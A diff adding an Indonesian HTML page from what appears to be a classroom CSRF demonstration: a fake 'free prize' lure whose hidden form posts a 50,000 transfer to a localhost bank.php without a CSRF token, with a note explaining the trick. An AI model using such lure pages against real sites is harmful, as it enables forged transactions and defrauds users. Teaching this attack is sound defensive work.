@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halaman Jahat - Simulasi CSRF</title>
+    <link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+    <div class="page-wrap">
+        <div class="container hacker-container">
+            <h1>😈 Halaman Penyerang</h1>
+            <p class="subtitle">Situs ini terlihat tidak berbahaya...</p>
+
+            <div class="hacker-box">
+                <p>Selamat! Anda mendapatkan <b>hadiah gratis</b> 🎁. Klik tombol di bawah untuk klaim sekarang!</p>
+
+                <!-- Form ini TIDAK menyertakan csrf_token -->
+                <form action="http://localhost/rsa-simulation-PHP-by-MuH-Akbar/Demonstrasi-CSRF-Token/bank.php" method="POST">
+                    <input type="hidden" name="jumlah" value="50000">
+                    <button type="submit" class="btn-hack">🎁 Klaim Hadiah Gratis!</button>
+                </form>
+            </div>
+
+            <div class="hacker-note">
+                <b>Di balik layar:</b> form ini otomatis mengirim <code>POST</code> ke <code>bank.php</code>
+                dengan jumlah transfer <code>Rp50.000</code> tanpa pernah menyertakan <code>csrf_token</code> yang sah.
+            </div>
+
+            <p class="info">
+                ⬅️ Kembali ke <a href="bank.php" target="_blank"><code>bank.php</code></a> untuk melihat hasilnya.
+            </p>
+        </div>
+    </div>
+</body>
+</html>
